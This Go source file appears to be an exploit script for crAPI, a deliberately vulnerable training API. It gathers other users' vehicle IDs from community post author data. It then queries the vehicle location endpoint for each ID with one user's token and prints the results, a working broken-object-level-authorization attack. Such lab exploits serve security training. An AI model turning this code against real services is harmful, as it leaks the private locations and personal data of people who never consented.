package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"

	configurator "github.com/tomek-skrond/crapiconfigurator/v2"
)

type Post struct {
	ID        string        `json:"id"`
	Title     string        `json:"title"`
	Content   string        `json:"content"`
	Author    Author        `json:"author"`
	Comments  []interface{} `json:"comments"`
	AuthorID  int           `json:"authorid"`
	CreatedAt string        `json:"CreatedAt"`
}

type Author struct {
	Nickname      string `json:"nickname"`
	Email         string `json:"email"`
	VehicleID     string `json:"vehicleid"`
	ProfilePicURL string `json:"profile_pic_url"`
	CreatedAt     string `json:"created_at"`
}

type PostResponse struct {
	Posts []Post `json:"posts"`
}

func extractBaseURL(url string) string {
	// Define the regular expression pattern to include the port if available
	re := regexp.MustCompile(`(https?://[^/]+)`)

	// Find the first match
	match := re.FindStringSubmatch(url)
	if len(match) > 1 {
		return match[1]
	}
	return ""
}

func GetPayload(targetUrl, token string, ids []string) {
	baseUrl := extractBaseURL(targetUrl)
	if baseUrl == "" {
		log.Fatalln("invalid baseurl")
	}
	for _, id := range ids {
		url := fmt.Sprintf("%s/identity/api/v2/vehicle/%s/location", baseUrl, id)

		req, _ := http.NewRequest("GET", url, nil)
		req = configurator.ConfigureRequest(req, token)

		res, err := http.DefaultClient.Do(req)
		if err != nil {
			log.Fatalln(err)
		}

		defer res.Body.Close()

		body, err := io.ReadAll(res.Body)
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Println(string(body))
	}
}

func GetVehicleIDs(url, token string) []string {
	req, _ := http.NewRequest("GET", url, nil)

	req = configurator.ConfigureRequest(req, token)

	res, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	defer res.Body.Close()

	body, err := io.ReadAll(res.Body)
	if err != nil {
		log.Fatalln(err)
	}

	var response PostResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Fatalln(err)
	}
	var ids []string
	for _, p := range response.Posts {
		vehicleId := p.Author.VehicleID
		if vehicleId != "" {
			ids = append(ids, vehicleId)
		}
		// fmt.Println(p.AuthorID)
	}
	return ids
}
